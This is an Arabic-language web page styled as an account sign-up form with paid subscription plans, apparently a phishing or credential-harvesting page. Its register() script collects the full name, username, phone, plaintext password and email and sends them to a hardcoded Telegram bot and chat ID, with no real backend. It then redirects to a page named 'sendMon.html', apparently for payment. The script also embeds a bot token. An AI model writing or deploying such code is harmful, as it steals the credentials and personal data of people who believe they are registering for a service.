<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>تسجيل حساب جديد</title>
    <style>
        @font-face {
            font-family: 'arabic';
            src: url('arabic.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        * {
            font-family: 'arabic', 'Cairo', sans-serif;
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: linear-gradient(135deg, #008983, #0086B1);
            
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            overflow: hidden;
        }



        .back-btn {
            color: #e0e0e0;
            text-decoration: none;
            font-size: clamp(12px, 3vw, 14px);
            display: block;
            margin-bottom: 2vh;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            color: #00d4ff;
            transform: translateX(5px);
        }

        h2 {
            text-align: center;
            margin-bottom: 4vh;
            font-size: clamp(24px, 6vw, 30px);
            font-weight: 700;
            color: #fff;
            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
        }

        .field {
            margin-bottom: 3.5vh;
            position: relative;
            animation: fadeIn 0.5s ease forwards;
            animation-delay: calc(var(--i) * 0.1s);
            opacity: 0;
        }

        label {
            font-size: clamp(12px, 3vw, 14px);
            margin-bottom: 1vh;
            color: #f0f0f0;
            font-weight: 500;
        }
 
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        input, select {
            width: 100%;
            padding: 2.5vw 2.5vw 2.5vw 10vw;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: clamp(12px, 3vw, 14px);
            transition: all 0.4s ease;
            box-shadow: inset 0 2px 3px rgba(0, 0, 0, 0.1);
        }

        input:focus, select:focus {
            border-color: #00d4ff;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5), inset 0 2px 6px rgba(0, 0, 0, 0.1);
            transform: scale(1.02);
            outline: none;
        } 

        input::placeholder {
            color: #ddd;
            font-weight: 400;
        }

        svg {
            position: absolute;
            left: 3vw;
            width: clamp(18px, 4vw, 22px);
            height: clamp(18px, 4vw, 22px);
            fill: #e0e0e0;
            transition: fill 0.3s ease;
        }

        input:focus + svg, select:focus + svg {
            fill: #00d4ff;
        }

        button {
            width: 100%;
            padding: 2.5vh;
            background: linear-gradient(135deg, #00d4ff, #007bff);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: clamp(14px, 3.5vw, 16px);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
            position: relative;
            overflow: hidden;
        }

        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.25);
            transition: all 0.4s ease;
        }

        button:hover::before {
            left: 100%;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 212, 255, 0.6);
            background: linear-gradient(135deg, #00eaff, #0091ff);
        }

        button:active {
            transform: translateY(0);
            box-shadow: 0 3px 10px rgba(0, 212, 255, 0.3);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes glow {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; }
        }

        @media (max-width: 768px) {
            .container {
                padding: 6vw;
                width: 80vw;
            }
            input, select {
                padding: 3vw 3vw 3vw 11vw;
            }
            svg {
                left: 3.5vw;
            }
            button {
                padding: 2.2vh;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 3vw;
                width: 85vw;
            }
            h2 {
                margin-bottom: 3vh;
            }
            .field {
                margin-bottom: 0.5vh;
            }
        }
    </style>
</head>
<body><center/>
    <div class="container">
        <button onclick="window.location.href='index.html'">عودة الى تسجيل الدخول</button>
        <h2>تسجيل حساب جديد</h2>
        <div class="field" style="--i: 1">
       
     <label for="fullname">لتسجيل حساب جديد يجب إملاء بيانات التالية</label>
     <br/>    <br/>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                <input type="text" id="fullname" placeholder="أدخل اسمك الكامل" required>
            </div>
        </div>
        <div class="field" style="--i: 2">
            
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5c0 2.76 2.24 5 5 5s5-2.24 5-5a5 5 0 00-5-5zm0 12c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/></svg>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
            </div>
        </div>
        <div class="field" style="--i: 3">
            

            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.91 15.91 0 006.59 6.59l2.2-2.2a1 1 0 011.41-.13c.79.39 1.65.63 2.58.63a1 1 0 011 1v3.5a1 1 0 01-1 1C9.07 22 2 14.93 2 6.5a1 1 0 011-1h3.5a1 1 0 011 1c0 .93.24 1.79.63 2.58a1 1 0 01-.13 1.41l-2.2 2.2z"/></svg>
              <input type="text" id="phone" placeholder="أدخل رقم هاتفك" required>
            </div>
        </div>
        <div class="field" style="--i: 4">
            
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 17a2 2 0 100-4 2 2 0 000 4zm6-9a2 2 0 00-2-2H8a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V8z"/></svg>
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
            </div>
        </div>
        <div class="field" style="--i: 5">
            
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2zm-1 2.59l-7 4.67-7-4.67V6h14v.59z"/></svg>
                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
            </div>
        </div>
        <div class="field" style="--i: 6">
         
            <div class="input-wrapper">
            
                <select id="plan" required>
                    <option value="">أختيار باقة الإشتراك</option>
                    <option value="€0.99">الباقة الأولى - €0.99</option>
                    <option value="€4.99">الباقة المتوسطة - €4.99</option>
                    <option value="€9.99">الباقة الكاملة - €9.99</option>
                </select>
            </div>
        </div>
        <button onclick="register()">تسجيل الآن</button>
    </div>

    <script>
        function register() {
            let fullname = document.getElementById('fullname').value.trim();
            let username = document.getElementById('username').value.trim();
            let phone = document.getElementById('phone').value.trim();
            let password = document.getElementById('password').value.trim();
            let email = document.getElementById('email').value.trim();
            let plan = document.getElementById('plan').value;

            if (!fullname || !username || !phone || !password || !email || !plan) {
                alert('يرجى ملء جميع الحقول');
                return;
            }

            let message = `مسجل جديد:\nالاسم: ${fullname}\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}\nالباقة المختارة: ${plan}`;

            let chatId = "6431271423";
            let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(res => res.json())
            .then(data => {
                console.log("تم إرسال التسجيل إلى تيليجرام", data);
                window.location.href = "sendMon.html";
            })
            .catch(error => {
                console.error("خطأ في إرسال البيانات", error);
                alert('حدث خطأ أثناء الإرسال. حاول مرة أخرى.');
            });
        }
    </script>
</body>
</html>
